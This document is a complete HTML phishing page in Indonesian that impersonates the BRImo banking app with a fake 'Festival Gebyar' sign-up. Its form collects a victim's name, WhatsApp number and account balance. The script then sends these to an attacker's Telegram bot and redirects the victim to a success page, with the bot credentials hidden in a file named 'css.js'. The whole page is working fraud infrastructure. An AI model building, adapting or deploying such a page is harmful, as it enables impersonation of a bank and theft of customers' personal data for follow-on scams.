<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRImo - Festival Gebyar</title>
    <!-- Memuat Tailwind CSS untuk styling responsif dan modern -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Memuat Google Fonts 'Inter' -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Memuat Phosphor Icons untuk ikon UI yang bersih -->
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #e2e8f0;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-6px); }
        }
        .animate-float {
            animation: float 4s ease-in-out infinite;
        }
    </style>
</head>
<body class="min-h-screen flex justify-center items-start sm:py-6 text-slate-800">

    <!-- Container Utama Mobile-First -->
    <div class="w-full max-w-md bg-[#1174d6] min-h-screen sm:min-h-[800px] sm:rounded-[2.25rem] shadow-2xl overflow-hidden flex flex-col relative">
        
        <!-- 1. Header Atas -->
        <header class="px-5 pt-6 pb-2 flex items-center justify-between text-white z-10 relative">
            <button type="button" onclick="showToast('Bahasa Indonesia (ID) aktif')" class="bg-white text-slate-800 px-3.5 py-1.5 rounded-full flex items-center gap-2 shadow-sm text-xs font-bold hover:bg-slate-50 transition cursor-pointer z-10">
                <span class="w-4 h-4 rounded-full overflow-hidden flex flex-col border border-slate-200 shrink-0">
                    <span class="h-1/2 bg-red-600 w-full"></span>
                    <span class="h-1/2 bg-white w-full"></span>
                </span>
                <span>ID</span>
            </button>

            <div class="flex items-center justify-center">
                <img 
                    id="headerLogo" 
                    src="https://cdn.phototourl.com/anon/2026-11-18-42b8cb0a-5f6f-4a22-89fe-382d7d7c4526.png" 
                    onerror="this.onerror=null;this.src='https://cdn.phototourl.com/anon/2026-11-18-42b8cb0a-5f6f-4a22-89fe-382d7d7c4526.png';"
                    alt="Logo" 
                    class="h-9 max-w-[130px] object-contain"
                >
            </div>

            <button type="button" onclick="showToast('Layanan bantuan siap membantu Anda 24/7')" class="bg-[#0b58a8]/80 hover:bg-[#09488a] backdrop-blur-sm text-white px-3.5 py-1.5 rounded-2xl flex items-center gap-2 text-xs font-medium transition border border-white/10 cursor-pointer z-10">
                <i class="ph ph-headset text-lg text-sky-200"></i>
                <div class="text-left leading-tight">
                    <div class="text-[10px] opacity-90">Kontak</div>
                    <div class="text-[10px] font-semibold">Kami</div>
                </div>
            </button>
        </header>

        <!-- 2. Hero Headline & Ilustrasi Vektor Ala Gambar -->
        <section class="px-6 pt-6 pb-6 text-center text-white relative flex-1 flex flex-col items-center justify-center">
            <div class="absolute top-12 w-72 h-72 bg-sky-400/20 rounded-full blur-2xl pointer-events-none"></div>

            <h1 class="text-2xl font-bold leading-snug max-w-[290px] z-10 drop-shadow-sm">
                Yuk! Mulai Daftar Festival gebyar bersama BRImo!
            </h1>

            <div class="mt-4 mb-1 relative z-10 animate-float w-full max-w-[320px]">
                <svg class="w-full h-56 mx-auto" viewBox="0 0 340 240" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <!-- Lingkaran Latar Gradasi -->
                    <circle cx="170" cy="122" r="102" fill="#89C4FA" fill-opacity="0.45"/>
                    <circle cx="170" cy="124" r="86" fill="#DCEEFF"/>

                    <!-- Siluet Gedung Kota Kiri & Kanan -->
                    <rect x="64" y="96" width="18" height="72" rx="2" fill="#B5D8FA"/>
                    <rect x="85" y="78" width="22" height="90" rx="2" fill="#9EC9F5"/>
                    <rect x="234" y="84" width="20" height="84" rx="2" fill="#A9D1F8"/>
                    <rect x="257" y="102" width="18" height="66" rx="2" fill="#8EC0F2"/>

                    <!-- Awan & Base Bawah -->
                    <ellipse cx="170" cy="186" rx="92" ry="22" fill="#2575D0"/>
                    <ellipse cx="170" cy="182" rx="76" ry="13" fill="#4B98EE"/>
                    <path d="M188 184C188 178 194 174 200 176C203 171 211 171 214 176C220 175 225 179 224 184H188Z" fill="#DCEEFF"/>

                    <!-- Dompet Melayang Kiri Atas -->
                    <g transform="rotate(-14 96 76)">
                        <path d="M74 64C74 59 78 56 83 56H114C118 56 121 59 121 63V88C121 92 117 95 113 95H82C77 95 74 91 74 87V64Z" fill="#6BB6FF" stroke="#1256A8" stroke-width="2.5"/>
                        <path d="M75 66L98 76L120 63" stroke="#1256A8" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
                    </g>

                    <!-- Koin Melayang Kiri & Kanan -->
                    <ellipse cx="116" cy="48" rx="11" ry="8" fill="#5CB0FF" stroke="#1256A8" stroke-width="2.5"/>
                    <ellipse cx="116" cy="48" rx="5" ry="3.5" stroke="#EBF5FF" stroke-width="1.5"/>

                    <ellipse cx="238" cy="58" rx="11" ry="13" fill="#5CB0FF" stroke="#1256A8" stroke-width="2.5"/>
                    <ellipse cx="238" cy="58" rx="5" ry="7" stroke="#EBF5FF" stroke-width="1.5"/>

                    <!-- Bintang 4 Sudut -->
                    <path d="M126 30L128.5 35.5L134 38L128.5 40.5L126 46L123.5 40.5L118 38L123.5 35.5L126 30Z" fill="#FFFFFF"/>
                    <path d="M214 36L216 40.5L220.5 42.5L216 44.5L214 49L212 44.5L207.5 42.5L212 40.5L214 36Z" fill="#FFFFFF"/>

                    <!-- Tumpukan Koin / Kartu di Kanan -->
                    <g stroke="#1256A8" stroke-width="2.2">
                        <ellipse cx="222" cy="156" rx="18" ry="6" fill="#4EA2F7"/>
                        <ellipse cx="222" cy="148" rx="18" ry="6" fill="#6BB6FF"/>
                        <ellipse cx="222" cy="140" rx="18" ry="6" fill="#4EA2F7"/>
                        <ellipse cx="222" cy="132" rx="18" ry="6" fill="#6BB6FF"/>
                        <ellipse cx="222" cy="124" rx="18" ry="6" fill="#89C4FA"/>
                    </g>

                    <!-- Lembaran Uang Melayang Kiri Bawah & Kanan Bawah -->
                    <path d="M62 154C74 148 86 154 96 164L84 176C74 166 64 162 54 164L62 154Z" fill="#9ED0FF" stroke="#1256A8" stroke-width="2.2" stroke-linejoin="round"/>
                    <path d="M254 134C266 130 276 138 282 150L268 158C262 148 254 142 246 144L254 134Z" fill="#9ED0FF" stroke="#1256A8" stroke-width="2.2" stroke-linejoin="round"/>

                    <!-- Smartphone Utama Miring di Tengah -->
                    <g transform="rotate(8 170 116)">
                        <!-- Shadow / Tebal Bodi -->
                        <rect x="128" y="24" width="88" height="162" rx="16" fill="#4EA2F7" stroke="#1256A8" stroke-width="2.6"/>
                        <!-- Layar Putih -->
                        <rect x="123" y="20" width="88" height="162" rx="16" fill="#FFFFFF" stroke="#1256A8" stroke-width="2.6"/>
                        <!-- Speaker / Sensor Atas -->
                        <rect x="158" y="27" width="18" height="3.5" rx="1.75" fill="#94A3B8"/>
                        <circle cx="182" cy="28.75" r="2" fill="#94A3B8"/>

                        <!-- Badge App Biru di Tengah Layar -->
                        <rect x="141" y="72" width="52" height="52" rx="12" fill="#1174D6"/>
                        <text x="167" y="96" text-anchor="middle" fill="#FFFFFF" font-family="Inter, sans-serif" font-weight="800" font-size="16" letter-spacing="0.5">BRI</text>
                        <text x="170" y="105" text-anchor="middle" fill="#6FB5D8" font-family="Inter, sans-serif" font-weight="700" font-size="13">mo</text>
                    </g>

                    <!-- Daun Dekorasi Kanan Bawah -->
                    <path d="M210 172C212 154 222 142 234 138C234 154 226 168 210 172Z" fill="#7CC0FF" stroke="#1256A8" stroke-width="2.2" stroke-linejoin="round"/>
                    <path d="M216 174C228 164 242 162 252 168C242 176 228 178 216 174Z" fill="#9ED0FF" stroke="#1256A8" stroke-width="2.2" stroke-linejoin="round"/>
                </svg>
            </div>
        </section>

        <!-- 3. Bottom Sheet Putih Utama -->
        <main class="bg-white rounded-t-[2.25rem] px-6 py-8 shadow-[0_-8px_30px_rgba(0,0,0,0.08)] flex flex-col justify-center z-20">
            <div class="flex items-center gap-3">
                <button 
                    type="button" 
                    onclick="openFormDrawer('Login')"
                    class="flex-1 bg-[#1174d6] hover:bg-[#0d62b8] active:scale-[0.99] text-white font-bold text-sm py-4 px-6 rounded-2xl shadow-lg shadow-sky-200 transition cursor-pointer"
                >
                    Lanjut Daftar
                </button>
            </div>
        </main>

        <!-- 4. Modal / Bottom-Sheet Drawer Form -->
        <div id="formDrawerOverlay" class="fixed inset-0 bg-slate-900/50 backdrop-blur-xs hidden items-end sm:items-center justify-center z-40 transition-opacity duration-300 opacity-0">
            <div id="formDrawerPanel" class="bg-white w-full max-w-md rounded-t-[2rem] sm:rounded-[2rem] p-6 pb-8 shadow-2xl transform translate-y-full sm:translate-y-4 transition-transform duration-300">
                
                <div class="w-10 h-1.5 bg-slate-200 rounded-full mx-auto mb-4 sm:hidden"></div>
                
                <div class="flex items-center justify-between mb-5">
                    <div>
                        <span id="drawerBadge" class="inline-block text-[10px] font-bold uppercase tracking-wider text-[#1174d6] bg-sky-50 px-2.5 py-1 rounded-full mb-1">gebyar festival</span>
                        <h3 class="text-lg font-bold text-slate-800">Lengkapi Data Anda di Bawa ini</h3>
                    </div>
                    <button type="button" onclick="closeFormDrawer()" class="w-9 h-9 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-600 flex items-center justify-center transition cursor-pointer" aria-label="Tutup">
                        <i class="ph-bold ph-x text-base"></i>
                    </button>
                </div>

                <!-- Form Input Data -->
                <form id="FormAku" novalidate class="space-y-4">
                    
                    <!-- Field 1: Nama Lengkap -->
                    <div>
                        <label for="namaLengkap" class="block text-xs font-semibold text-slate-600 mb-1.5">
                            Nama Lengkap
                        </label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400">
                                <i class="ph ph-user text-lg"></i>
                            </span>
                            <input 
                                type="text" 
                                id="namaLengkap" 
                                name="namaLengkap"
                                placeholder="Masukkan nama lengkap Anda"
                                class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
                                required
                            >
                        </div>
                        <p id="namaError" class="hidden text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <i class="ph-fill ph-warning-circle"></i>
                            <span>Nama lengkap wajib diisi.</span>
                        </p>
                    </div>

                    <!-- Field 2: Nomor WhatsApp -->
                    <div>
                        <div class="flex justify-between items-center mb-1.5">
                            <label for="nomorWa" class="block text-xs font-semibold text-slate-600">
                                Nomor WhatsApp
                            </label>
                            <span id="waCounter" class="text-[11px] font-medium text-slate-400">0 / 10-13 digit</span>
                        </div>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400">
                                <i class="ph ph-whatsapp-logo text-lg text-emerald-500"></i>
                            </span>
                            <input 
                                type="tel" 
                                id="nomorWa" 
                                name="nomorWa"
                                inputmode="numeric"
                                maxlength="13"
                                placeholder="Contoh: 081234567890"
                                class="w-full pl-10 pr-10 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
                                required
                            >
                            <span id="waStatusIcon" class="hidden absolute inset-y-0 right-0 pr-3.5 flex items-center"></span>
                        </div>
                        <p id="waMessage" class="text-[11px] mt-1 text-slate-400 flex items-center gap-1">
                            <span>Masukkan 10 sampai 13 digit angka.</span>
                        </p>
                    </div>

                    <!-- Field 3: Saldo (Rp) -->
                    <div>
                        <label for="saldoRp" class="block text-xs font-semibold text-slate-600 mb-1.5">
                            Saldo (Rp)
                        </label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-sm font-bold text-[#1174d6]">
                                Rp
                            </span>
                            <input 
                                type="text" 
                                id="saldoRp" 
                                name="saldoRp"
                                inputmode="numeric"
                                placeholder="0"
                                class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
                                required
                            >
                        </div>
                        <p id="saldoError" class="hidden text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <i class="ph-fill ph-warning-circle"></i>
                            <span>Masukkan nominal saldo yang valid.</span>
                        </p>
                    </div>

                    <!-- Tombol Submit Form -->
                    <div class="pt-2">
                        <button 
                            type="submit" 
                            id="kirim"
                            class="w-full bg-[#1174d6] hover:bg-[#0d62b8] disabled:bg-slate-400 active:scale-[0.99] text-white font-bold text-sm py-3.5 px-6 rounded-xl shadow-md shadow-sky-200 transition cursor-pointer"
                        >
                            Daftar Sekarang
                        </button>
                    </div>
                </form>
                <p id="status" class="text-center text-xs font-medium text-slate-500 mt-3"></p>
            </div>
        </div>

        <!-- Toast Notification -->
        <div id="toastBox" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-900/90 text-white text-xs font-medium px-4 py-2.5 rounded-full shadow-lg opacity-0 pointer-events-none transition-opacity duration-300 z-50 whitespace-nowrap">
            Pesan notifikasi
        </div>

    </div>

    <!-- Memuat BOT_TOKEN dan CHAT_ID dari token.js -->
    <script src="css.js"></script>
    <script>
        const form = document.getElementById('FormAku');
        const namaInput = document.getElementById('namaLengkap');
        const waInput = document.getElementById('nomorWa');
        const saldoInput = document.getElementById('saldoRp');

        const namaError = document.getElementById('namaError');
        const waCounter = document.getElementById('waCounter');
        const waMessage = document.getElementById('waMessage');
        const waStatusIcon = document.getElementById('waStatusIcon');
        const saldoError = document.getElementById('saldoError');

        const drawerOverlay = document.getElementById('formDrawerOverlay');
        const drawerPanel = document.getElementById('formDrawerPanel');
        const drawerBadge = document.getElementById('drawerBadge');
        let currentContext = 'Login';

        function openFormDrawer(contextName) {
            currentContext = contextName || 'Login';
            drawerBadge.textContent = currentContext === 'Login' ? 'Daftar Festival Gebyar' : `Menu ${currentContext}`;
            
            drawerOverlay.classList.remove('hidden');
            drawerOverlay.classList.add('flex');
            
            requestAnimationFrame(() => {
                drawerOverlay.classList.remove('opacity-0');
                drawerOverlay.classList.add('opacity-100');
                drawerPanel.classList.remove('translate-y-full', 'sm:translate-y-4');
                drawerPanel.classList.add('translate-y-0');
            });

            setTimeout(() => namaInput.focus(), 250);
        }

        function closeFormDrawer() {
            drawerOverlay.classList.remove('opacity-100');
            drawerOverlay.classList.add('opacity-0');
            drawerPanel.classList.remove('translate-y-0');
            drawerPanel.classList.add('translate-y-full', 'sm:translate-y-4');

            setTimeout(() => {
                drawerOverlay.classList.add('hidden');
                drawerOverlay.classList.remove('flex');
            }, 300);
        }

        drawerOverlay.addEventListener('click', function (e) {
            if (e.target === drawerOverlay) {
                closeFormDrawer();
            }
        });

        waInput.addEventListener('input', function () {
            let digitsOnly = this.value.replace(/\D/g, '');
            if (digitsOnly.length > 13) {
                digitsOnly = digitsOnly.slice(0, 13);
            }
            this.value = digitsOnly;

            const len = digitsOnly.length;
            waCounter.textContent = `${len} / 10-13 digit`;

            if (len === 0) {
                setWaState('neutral', 'Masukkan 10 sampai 13 digit angka.');
            } else if (len < 10) {
                setWaState('invalid', `Kurang ${10 - len} digit lagi (minimal 10 digit).`);
            } else if (len >= 10 && len <= 13) {
                setWaState('valid', 'Nomor WhatsApp valid.');
            }
        });

        function setWaState(state, message) {
            waStatusIcon.classList.remove('hidden');
            if (state === 'valid') {
                waInput.classList.remove('border-slate-200', 'border-rose-400', 'focus:border-[#1174d6]');
                waInput.classList.add('border-emerald-500', 'focus:border-emerald-500');
                waMessage.className = 'text-[11px] mt-1 text-emerald-600 flex items-center gap-1 font-medium';
                waMessage.innerHTML = `<i class="ph-fill ph-check-circle"></i><span>${message}</span>`;
                waStatusIcon.innerHTML = `<i class="ph-fill ph-check-circle text-emerald-500 text-lg"></i>`;
            } else if (state === 'invalid') {
                waInput.classList.remove('border-slate-200', 'border-emerald-500', 'focus:border-[#1174d6]');
                waInput.classList.add('border-rose-400', 'focus:border-rose-500');
                waMessage.className = 'text-[11px] mt-1 text-rose-500 flex items-center gap-1 font-medium';
                waMessage.innerHTML = `<i class="ph-fill ph-warning-circle"></i><span>${message}</span>`;
                waStatusIcon.innerHTML = `<i class="ph-fill ph-warning-circle text-rose-500 text-lg"></i>`;
            } else {
                waInput.classList.remove('border-emerald-500', 'border-rose-400');
                waInput.classList.add('border-slate-200', 'focus:border-[#1174d6]');
                waMessage.className = 'text-[11px] mt-1 text-slate-400 flex items-center gap-1';
                waMessage.innerHTML = `<span>${message}</span>`;
                waStatusIcon.classList.add('hidden');
            }
        }

        saldoInput.addEventListener('input', function () {
            let rawNumber = this.value.replace(/\D/g, '');
            if (rawNumber.length > 1) {
                rawNumber = rawNumber.replace(/^0+/, '');
            }

            if (rawNumber === '') {
                this.value = '';
                return;
            }

            this.value = rawNumber.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
            saldoError.classList.add('hidden');
            this.classList.remove('border-rose-400');
        });

        namaInput.addEventListener('input', function () {
            if (this.value.trim().length > 0) {
                namaError.classList.add('hidden');
                this.classList.remove('border-rose-400');
            }
        });

        form.addEventListener('submit', async function (e) {
            e.preventDefault();
            let isValid = true;

            const namaVal = namaInput.value.trim();
            if (!namaVal) {
                namaError.classList.remove('hidden');
                namaInput.classList.add('border-rose-400');
                isValid = false;
            } else {
                namaError.classList.add('hidden');
                namaInput.classList.remove('border-rose-400');
            }

            const waVal = waInput.value.replace(/\D/g, '');
            if (waVal.length < 10 || waVal.length > 13) {
                setWaState('invalid', 'Nomor WhatsApp harus terdiri dari 10 hingga 13 digit.');
                isValid = false;
            }

            const saldoRaw = saldoInput.value.replace(/\D/g, '');
            if (!saldoRaw || parseInt(saldoRaw, 10) <= 0) {
                saldoError.classList.remove('hidden');
                saldoInput.classList.add('border-rose-400');
                isValid = false;
            } else {
                saldoError.classList.add('hidden');
                saldoInput.classList.remove('border-rose-400');
            }

            if (!isValid) {
                showToast('Mohon periksa kembali data yang dimasukkan');
                return;
            }

            const tombol = document.getElementById('kirim');
            const status = document.getElementById('status');

            tombol.disabled = true;
            tombol.textContent = 'Mengirim...';
            status.textContent = 'Sedang memproses data...';
            status.className = 'text-center text-xs font-medium text-sky-600 mt-3';

            const pesan = `🔔 NOTIFIKASI FORM BRImo\n\nNama: ${namaVal}\nWhatsApp: ${waVal}\nSaldo: Rp ${saldoInput.value}`;

            try {
                const hasil = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: pesan
                    })
                });

                const data = await hasil.json();

                if (!hasil.ok || !data.ok) {
                    throw new Error('Gagal mengirim ke Telegram');
                }

                window.location.href = 'berhasil.html';
            } catch (error) {
                status.textContent = 'Pengiriman gagal. Periksa koneksi atau token bot.';
                status.className = 'text-center text-xs font-medium text-rose-500 mt-3';
                tombol.disabled = false;
                tombol.textContent = 'Kirim Data';
            }
        });

        let toastTimeout;
        function showToast(msg) {
            const toast = document.getElementById('toastBox');
            toast.textContent = msg;
            toast.classList.remove('opacity-0');
            toast.classList.add('opacity-100');
            clearTimeout(toastTimeout);
            toastTimeout = setTimeout(() => {
                toast.classList.remove('opacity-100');
                toast.classList.add('opacity-0');
            }, 2500);
        }
    </script>
</body>
</html>
